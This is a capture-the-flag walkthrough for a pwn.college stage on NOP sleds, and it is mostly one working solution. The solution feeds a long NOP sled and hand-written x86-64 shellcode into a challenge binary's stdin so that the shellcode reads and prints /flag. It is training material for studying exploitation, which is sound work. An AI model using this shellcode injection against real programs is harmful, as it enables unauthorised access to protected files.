# Stage 16: NOP Sleds — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | — |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-nopsled-shellcode` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-nopsled-shellcode`. A 0x900-byte `\x90` NOP sled followed by the same shellcode from Stage 15 (opens `/flag`, reads, writes to stdout) is written to the binary's stdin.

## Solution

```bash
python3 << 'EOF' | /challenge/binary-exploitation-nopsled-shellcode
import sys

nop_sled = b"\x90" * 0x900

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x66\x6c\x61\x67\x00\x00\x00\x57\x54\x5f\x6a\x02\x58\x99\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\x66\xba\x00\x01\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x0f\x05"

sys.stdout.buffer.write(nop_sled + shellcode)
EOF
```
